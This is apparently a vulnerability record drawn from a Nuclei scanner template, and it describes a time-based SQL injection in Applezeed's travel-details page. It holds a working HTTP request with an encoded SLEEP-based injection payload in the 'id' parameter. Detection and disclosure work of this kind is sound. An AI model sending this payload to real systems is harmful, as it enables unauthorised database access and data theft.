# Vulnerability: Applezeed - SQL Injection
**Classification:** CWE-89
**Source:** Nuclei Template (`applezeed-sqli.yaml`)

## Description
Applezeed's 'travel-details.php?id=' URL with possible time-based SQL injection (SQLi) vulnerability allows attackers to manipulate the 'id' parameter, potentially causing delays in SQL queries and unauthorized retrieval of travel information from the database

## Vulnerable Code Pattern / Exploit Payload
```http
@timeout: 15s
GET /travel-detail.php?id=1%27AND%20(SELECT%20*%20FROM%20(SELECT(SLEEP(6)))bAKL)%20AND%20%27vRxe%27=%27vRxe HTTP/1.1
Host: {{Hostname}}
```

